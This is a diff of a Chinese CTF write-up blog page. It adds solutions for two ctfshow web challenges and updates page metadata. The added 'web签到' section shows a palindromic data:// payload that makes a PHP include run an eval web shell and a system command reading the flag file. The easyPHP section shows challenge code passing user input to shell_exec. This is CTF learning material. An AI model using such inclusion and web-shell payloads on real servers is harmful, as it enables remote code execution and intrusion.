@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2023/05/22/ctfshow/QQ%E6%88%AA%E5%9B%BE20230528192948.png">
 <meta property="article:published_time" content="2023-05-22T09:35:14.000Z">
-<meta property="article:modified_time" content="2023-05-29T04:37:37.625Z">
+<meta property="article:modified_time" content="2023-06-04T15:39:17.409Z">
 <meta property="article:author" content="小zhou">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2023/05/22/ctfshow/QQ%E6%88%AA%E5%9B%BE20230528192948.png">
@@ -225,7 +225,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-29 12:37:37" itemprop="dateModified" datetime="2023-05-29T12:37:37+08:00">2023-05-29</time>
+                <time title="修改时间：2023-06-04 23:39:17" itemprop="dateModified" datetime="2023-06-04T23:39:17+08:00">2023-06-04</time>
               </span>
 
           <br>
@@ -234,14 +234,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.7k</span>
+              <span>1.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -362,6 +362,18 @@
 <p>账号 admin空格</p>
 <p> 密码随意；登录，他把所有字符都过滤了，那不穿就行了</p>
 <p>payload：index.php?c&#x3D;</p>
+<h1 id="单身杯"><a href="#单身杯" class="headerlink" title="单身杯"></a>单身杯</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>strrev，字符反转函数?&gt;，进行闭合，后面不影响</p>
+<p>伪协议读取，</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="easyPHP"><a href="#easyPHP" class="headerlink" title="easyPHP"></a>easyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>学习两个新的命令</p>
+<p>sed</p>
+<p>awk</p>
 
     </div>
 
@@ -397,8 +409,8 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="prev" title="练习1">
-      <i class="fa fa-chevron-left"></i> 练习1
+    <a href="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="prev" title="vulnhub练习1">
+      <i class="fa fa-chevron-left"></i> vulnhub练习1
     </a></div>
       <div class="post-nav-item">
     <a href="/2023/05/23/%E6%AF%8F%E5%91%A8%E5%A4%A7%E6%8C%91%E6%88%98/" rel="next" title="每周大挑战">
@@ -462,7 +474,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B9%B4ctf"><span class="nav-number">1.</span> <span class="nav-text">年ctf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%A4%E5%A4%95"><span class="nav-number">1.1.</span> <span class="nav-text">除夕</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E4%B8%89"><span class="nav-number">1.2.</span> <span class="nav-text">初三</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E5%85%AD"><span class="nav-number">1.3.</span> <span class="nav-text">初六</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2023%E6%84%9A%E4%BA%BA%E6%9D%AF"><span class="nav-number">2.</span> <span class="nav-text">2023愚人杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.</span> <span class="nav-text">被遗忘的反序列化</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%88%E9%A5%BC%E6%9D%AF"><span class="nav-number">3.</span> <span class="nav-text">月饼杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1-%E6%AD%A4%E5%A4%9C%E5%9C%86"><span class="nav-number">3.1.</span> <span class="nav-text">web1_此夜圆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3-%E8%8E%AB%E8%B4%9F%E5%A9%B5%E5%A8%9F"><span class="nav-number">3.2.</span> <span class="nav-text">web3_莫负婵娟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-%E6%95%85%E4%BA%BA%E5%BF%83"><span class="nav-number">3.3.</span> <span class="nav-text">web2_故人心</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#36D%E7%BB%83%E6%89%8B%E8%B5%9B"><span class="nav-number">4.</span> <span class="nav-text">36D练手赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E7%9F%A5%E6%89%80%E6%8E%AA-jpg"><span class="nav-number">4.1.</span> <span class="nav-text">不知所措.jpg</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%90%8C%E6%96%B0%E8%B5%9B"><span class="nav-number">5.</span> <span class="nav-text">萌新赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%87%E8%B5%9B%E7%94%9F"><span class="nav-number">5.1.</span> <span class="nav-text">假赛生</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B9%B4ctf"><span class="nav-number">1.</span> <span class="nav-text">年ctf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%A4%E5%A4%95"><span class="nav-number">1.1.</span> <span class="nav-text">除夕</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E4%B8%89"><span class="nav-number">1.2.</span> <span class="nav-text">初三</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9D%E5%85%AD"><span class="nav-number">1.3.</span> <span class="nav-text">初六</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2023%E6%84%9A%E4%BA%BA%E6%9D%AF"><span class="nav-number">2.</span> <span class="nav-text">2023愚人杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.</span> <span class="nav-text">被遗忘的反序列化</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%88%E9%A5%BC%E6%9D%AF"><span class="nav-number">3.</span> <span class="nav-text">月饼杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1-%E6%AD%A4%E5%A4%9C%E5%9C%86"><span class="nav-number">3.1.</span> <span class="nav-text">web1_此夜圆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3-%E8%8E%AB%E8%B4%9F%E5%A9%B5%E5%A8%9F"><span class="nav-number">3.2.</span> <span class="nav-text">web3_莫负婵娟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-%E6%95%85%E4%BA%BA%E5%BF%83"><span class="nav-number">3.3.</span> <span class="nav-text">web2_故人心</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#36D%E7%BB%83%E6%89%8B%E8%B5%9B"><span class="nav-number">4.</span> <span class="nav-text">36D练手赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8D%E7%9F%A5%E6%89%80%E6%8E%AA-jpg"><span class="nav-number">4.1.</span> <span class="nav-text">不知所措.jpg</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%90%8C%E6%96%B0%E8%B5%9B"><span class="nav-number">5.</span> <span class="nav-text">萌新赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%87%E8%B5%9B%E7%94%9F"><span class="nav-number">5.1.</span> <span class="nav-text">假赛生</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%95%E8%BA%AB%E6%9D%AF"><span class="nav-number">6.</span> <span class="nav-text">单身杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E7%AD%BE%E5%88%B0"><span class="nav-number">6.1.</span> <span class="nav-text">web签到</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyPHP"><span class="nav-number">6.2.</span> <span class="nav-text">easyPHP</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -478,7 +490,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-count">36</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -532,7 +544,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:14</span>
 </div>
 
 <!--
